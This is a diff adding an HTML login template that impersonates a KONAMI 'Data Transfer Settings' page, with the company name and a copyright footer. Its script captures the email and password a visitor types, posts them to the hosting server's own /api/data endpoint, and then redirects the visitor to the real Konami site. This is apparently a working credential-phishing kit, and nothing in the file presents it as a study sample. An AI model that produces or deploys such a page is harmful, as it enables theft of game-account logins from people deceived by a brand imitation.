@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+ <div class="header">KONAMI</div>   
+ <div  class="sub-head">Data Transfer Settings</div>
+ <div class="container">
+     <form id="LoginForm">
+         <input type="email" placeholder="KONAMI ID or email  address" id="email" required>
+         <input type="password" placeholder="Password" id="password" required>
+         <p class="info">Users who use the KONAMI OTP Service only</p>
+         <button type="submit">Login</button>
+     </form>
+     
+     <button class="btn">< Back</button>
+
+     <a href="https://my.konami/forgotpassword">> Forgot your password?</a>
+ <p class="footer">© 2022 Konami Digital Entertainment</p>
+ </div>
+</body>
+<script>
+document.getElementById("LoginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); 
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    fetch('/api/data', {
+        method: 'POST',
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({email, password})
+    })
+    .then((response) => {
+        if (!response.ok) throw new Error("Network response was not ok");
+        return response.json();
+    })
+    .then((data) => {
+        console.log(data);
+        window.location.href = "https://my.konami.net";
+    })
+
+    .catch((error) =>{
+        alert("Login failed or server error")
+        console.log(error);
+    });
+    })
+</script>
+</html>
